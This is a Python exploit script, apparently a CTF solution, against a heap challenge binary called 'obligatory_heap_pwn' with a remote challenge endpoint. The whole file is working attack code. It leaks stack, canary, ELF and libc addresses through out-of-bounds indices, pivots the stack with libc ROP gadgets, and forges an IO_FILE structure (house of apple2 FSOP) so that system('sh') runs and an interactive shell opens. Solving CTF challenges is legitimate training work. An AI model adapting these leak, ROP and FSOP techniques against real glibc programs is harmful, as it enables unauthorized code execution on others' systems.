
#!/usr/bin/env python3
from ctypes import CDLL
import time
from subprocess import Popen
from pwncli import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './obligatory_heap_pwn_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = "obligatory-heap-pwn-c00956c1196573eb.challs.brunnerne.xyz", 443


gdbscript = '''
init-pwndbg
# set architecture aarch64
# target remote :5000
b *vuln + 220
b *exit
c
'''.format(**locals())

def initialize(argv=[]):
    global pid
    if args.QEMU:
        if args.GDB:
            return process(["qemu-aarch64", "-g", "5000", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
        else:
            return process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/app/run"]).recvall().strip().decode()
        return p
    elif args.REMOTE:
        context.log_level = 'debug'
        return remote(host, port, ssl=True)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, aslr=False)
    else:
        return process([exe] + argv, aslr=False)

def debug():
    global gdbscript, pid
    if not args.REMOTE and not args.GDB:
        if args.QEMU:
            gdb_args = ["tmux", "splitw", "-h", "-p", "65", "gdb"]
            for cmd in [item for line in gdbscript.strip().splitlines() if (item := line.strip())]:
                gdb_args.extend(["-ex", cmd])
            Popen(gdb_args)
        elif args.DOCKER:
            gdbscript = f'''
            init-pwndbg
            set sysroot /proc/{pid}/root
            c
            '''.format(**locals())        
            attach(int(pid), gdbscript=gdbscript, sysroot=f"/proc/{pid}/root", exe='chall')
        else:
            attach(io, gdbscript=gdbscript)

s       = lambda data               :io.send(data)
sa      = lambda x, y               :io.sendafter(x, y)
sl      = lambda data               :io.sendline(data)
sla     = lambda x, y               :io.sendlineafter(x, y)
r       = lambda delims             :io.recv(delims)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
rl      = lambda                    :io.recvline()
uu32    = lambda data,num           :u32(io.recvuntil(data)[-num:].ljust(4,b'\x00'))
uu64    = lambda data,num           :u64(io.recvuntil(data)[-num:].ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{}: {}'.format(name, addr))
l64     = lambda                    :u64(io.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda                    :u32(io.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
ns      = lambda p, data            :next(p.search(data))
nsa     = lambda p, instr           :next(p.search(asm(instr, arch=p.arch)))


# =========================================================
#                         EXPLOITS
# =========================================================
def fsop_shell(fp=None, rip=None, exit=True):
    io_obj = IO_FILE_plus_struct()
    fn = (
        io_obj.house_of_apple2_execmd_when_exit
        if exit
        else io_obj.house_of_apple2_execmd_when_do_IO_operation
    )
    return fn(
        fp if fp is not None else libc.sym["_IO_2_1_stdout_"],
        libc.sym["_IO_wfile_jumps"],
        rip if rip is not None else libc.sym["system"],
        "sh",
    )

def menu(op):
    sla("> ", str(op).encode())

def create(idx, content):
    menu(1)
    menu(idx)
    sa("> ", content)

def delete(idx):
    menu(2)
    menu(idx)

def view(idx):
    menu(3)
    menu(idx)

def exploit():
    global io
    io = initialize()
    with log.progress("Leak elf, libc, and stack address") as p:
        for i in range(1, 10):
            create(-50 - (i*10), b"\x00")
        create(i - 1, b"\x00")
        menu(4)
        view(2)
        ru("--> ")
        stack = int(rl().strip())
        ru("--> ")
        canary = int(rl().strip())
        view(3)
        ru("--> ")
        ru("--> ")
        elf_leak = int(rl().strip())

        elf.address = elf_leak - (elf.sym["main"] + 118)
        view(5)
        ru("--> ")
        ru("--> ")
        libc_leak = int(rl().strip())
        libc.address = libc_leak - (libc.sym["__libc_start_call_main"] + 122)
    leak("Stack", hex(stack))
    leak("Canary", hex(canary))
    leak("Elf leak", hex(elf_leak))
    leak("ELF base address", hex(elf.address))
    leak("Libc leak", hex(libc_leak))
    leak("Libc base address", hex(libc.address))

    with log.progress("Prepare to pivot the address"):
        delete(8)
        delete(stack)
        delete(stack + 0x10)
        delete(stack + 0x60)
        create(-79, p64(canary))
        gadget = nsa(libc, "pop rbx ; xor eax, eax ; pop rbp ; pop r12 ; ret")
        leave_ret = nsa(libc, "pop rdx ; leave ; ret")
        create(-78, p64(gadget))
        create(-77, p64(stack - 0x88)) # Address contain the payload 
        create(-76, p64(leave_ret)) 
        menu(4)
        delete(-140)
        delete(-130)
        delete(-120)
        delete(-110)


    with log.progress("Prepare the payload"), context.silent:
        create(nsa(libc, "pop rdi ; ret"), p64(libc.sym["_IO_2_1_stdout_"]))
        create(libc.sym["gets"], p64(libc.sym["exit"] + 5)) # Overwrite the first 8 bytes of the fake IO_FILE_plus struct with the system call
        menu(5) #Trigger
        debug()
        sla("bye\n", fsop_shell())
    io.interactive()

if __name__ == '__main__':
    exploit()
